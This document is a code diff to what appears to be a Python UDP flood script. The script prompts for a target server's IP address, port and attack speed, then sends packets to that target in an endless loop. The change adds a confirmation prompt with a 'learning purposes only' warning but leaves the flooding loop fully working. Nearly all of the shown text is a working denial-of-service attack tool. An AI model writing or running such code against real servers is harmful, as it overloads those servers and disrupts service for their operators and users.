@@ -36,13 +36,19 @@ print("╲______________________________________________________________________
 IP_address = input("Please enter the IP address of the server you want to attack:")
 TPS = int(input("Please enter the port of the server you want to attack:"))
 speed = int(input("Please enter the Attack speed(1-1000):"))
-
-print("OK is Attacking")
-os.system("clear")
-#变量设置
-sent = 0
-while True:
-    sock.sendto(bytes, (IP_address,TPS))
-    sent = sent + 1
-    print ("The server has been attacked  %s time for %s port %d"%(sent,IP_address,TPS))
-    time.sleep((1000-speed)/2000)
+huida = input("Warning: This script is for learning purposes only, don't break the law! Do you want to start an attack? (Y/N)")
+if huida == "Y":
+    print("OK is Attacking")
+    os.system("clear")
+    #变量设置
+    sent = 0
+    while True:
+        sock.sendto(bytes, (IP_address,TPS))
+        sent = sent + 1
+        print ("The server has been attacked  %s time for %s port %d"%(sent,IP_address,TPS))
+        time.sleep((1000-speed)/2000)
+elif huida == "N":
+    os.system("clear")
+    print("Turn off the attack!")
+else:
+    print("WTF")
